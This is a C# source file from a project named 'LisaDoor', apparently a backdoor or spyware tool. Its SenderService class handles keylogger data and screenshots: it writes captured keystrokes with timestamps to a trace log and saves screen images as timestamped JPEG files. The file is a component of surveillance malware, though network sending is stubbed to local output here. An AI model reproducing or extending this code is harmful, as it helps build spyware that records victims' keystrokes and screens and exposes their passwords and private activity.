using LisaDoor.Network;
using System.Diagnostics;
using System.Drawing.Imaging;

namespace LisaDoor
{
    internal static class SenderService
    {
        public static void SendMessage(IData data)
        {
            switch (data.MessageType)
            {
                case MessageType.KEYLOG:
                    Trace.WriteLine(((KLData)data).TimeCreated + " " + ((KLData)data).KeyData);
                    break;
                case MessageType.SCREENIMAGE:
                    string date = $"{DateTime.UtcNow.Year}{DateTime.UtcNow.Month}{DateTime.UtcNow.Day}{DateTime.UtcNow.Hour}{DateTime.UtcNow.Minute}{DateTime.UtcNow.Second}";
                    ((SSData)data).Image.Save($"{date}.jpg", ImageFormat.Jpeg);
                    ((SSData)data).Image.Dispose();
                    Trace.WriteLine(DateTime.UtcNow + " Screenshot taken");
                    break;
            }
        }
        public enum MessageType
        {
            KEYLOG,
            SCREENIMAGE
        }
    }
}